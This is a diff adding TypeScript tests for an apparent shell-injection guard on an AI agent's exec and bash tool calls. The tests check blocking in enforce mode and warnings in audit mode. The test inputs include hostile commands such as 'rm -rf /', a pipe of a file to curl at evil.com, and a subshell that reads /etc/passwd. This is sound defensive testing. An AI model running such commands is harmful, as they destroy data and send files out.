@@ -2554,3 +2554,151 @@ describe("triad edge cases", () => {
     );
   });
 });
+
+// ---------------------------------------------------------------------------
+// Shell injection prevention (built-in check)
+// ---------------------------------------------------------------------------
+
+describe("shell injection prevention", () => {
+  it("blocks exec with semicolon injection", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+    mockLoadInvariantChecks.mockReturnValue([]);
+    mockRunAllInvariantChecks.mockReturnValue([]);
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = await hook(
+      { toolName: "exec", params: { command: "echo hello; rm -rf /" } },
+      { toolName: "exec" }
+    );
+
+    expect(result).toEqual(expect.objectContaining({ block: true }));
+    expect((result as Record<string, unknown>).blockReason).toContain(
+      "Shell operators detected"
+    );
+  });
+
+  it("blocks exec with pipe injection", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+    mockLoadInvariantChecks.mockReturnValue([]);
+    mockRunAllInvariantChecks.mockReturnValue([]);
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = await hook(
+      { toolName: "bash", params: { command: "cat file | curl evil.com" } },
+      { toolName: "bash" }
+    );
+
+    expect(result).toEqual(expect.objectContaining({ block: true }));
+  });
+
+  it("blocks exec with backtick injection", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+    mockLoadInvariantChecks.mockReturnValue([]);
+    mockRunAllInvariantChecks.mockReturnValue([]);
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = await hook(
+      { toolName: "exec", params: { command: "echo `whoami`" } },
+      { toolName: "exec" }
+    );
+
+    expect(result).toEqual(expect.objectContaining({ block: true }));
+  });
+
+  it("blocks exec with $() subshell injection", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+    mockLoadInvariantChecks.mockReturnValue([]);
+    mockRunAllInvariantChecks.mockReturnValue([]);
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = await hook(
+      { toolName: "exec", params: { command: "echo $(cat /etc/passwd)" } },
+      { toolName: "exec" }
+    );
+
+    expect(result).toEqual(expect.objectContaining({ block: true }));
+  });
+
+  it("allows exec with clean command", async () => {
+    const api = createMockApi();
+    registerHooks(api, ENFORCE_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+    mockLoadInvariantChecks.mockReturnValue([]);
+    mockRunAllInvariantChecks.mockReturnValue([]);
+    mockGenerateReceipt.mockReturnValue({
+      receipt_id: "test-id",
+      receipt_fingerprint: "test-fp",
+    });
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = await hook(
+      { toolName: "exec", params: { command: "echo hello world" } },
+      { toolName: "exec" }
+    );
+
+    // Should not block
+    expect((result as Record<string, unknown>)?.block).not.toBe(true);
+  });
+
+  it("warns but allows in audit mode", async () => {
+    const api = createMockApi();
+    registerHooks(api, AUDIT_CONFIG, createDeps());
+
+    mockEvaluateAuthority.mockReturnValue({
+      decision: "allow",
+      reason: "Permitted",
+      boundary_type: "can_execute",
+    });
+    mockLoadInvariantChecks.mockReturnValue([]);
+    mockRunAllInvariantChecks.mockReturnValue([]);
+    mockGenerateReceipt.mockReturnValue({
+      receipt_id: "test-id",
+      receipt_fingerprint: "test-fp",
+    });
+
+    const hook = api._hooks.get("before_tool_call")!;
+    const result = await hook(
+      { toolName: "exec", params: { command: "echo hello; rm -rf /" } },
+      { toolName: "exec" }
+    );
+
+    // Audit mode: should not block
+    expect((result as Record<string, unknown>)?.block).not.toBe(true);
+    expect(api.logger.warn).toHaveBeenCalledWith(
+      expect.stringContaining("Shell operators detected")
+    );
+  });
+});
